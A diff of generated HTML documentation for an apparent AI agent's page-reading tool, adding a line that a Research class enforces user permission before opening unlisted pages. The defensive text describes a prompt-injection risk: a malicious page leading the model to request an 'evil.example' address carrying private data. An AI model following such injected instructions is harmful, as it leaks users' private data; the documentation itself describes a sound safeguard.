@@ -312,7 +312,8 @@
 <p>Read a web page (cache-first by URL) and store it in research memory.</p>
 <p>A page that the user’s search did not list is opened only with the user’s permission: a
 malicious page could otherwise make the model request <code class="docutils literal notranslate"><span class="pre">https://evil.example/?d=&lt;private</span>
-<span class="pre">data&gt;</span></code> and so carry data out in the address.</p>
+<span class="pre">data&gt;</span></code> and so carry data out in the address. <a class="reference internal" href="../research/index.html#voicemate.agent.tools.research.Research" title="voicemate.agent.tools.research.Research"><code class="xref py py-class docutils literal notranslate"><span class="pre">Research</span></code></a>
+enforces that; this tool supplies the question to ask.</p>
 <section id="attributes">
 <h2>Attributes<a class="headerlink" href="#attributes" title="Link to this heading">¶</a></h2>
 <div class="table-wrapper autosummary longtable docutils container">
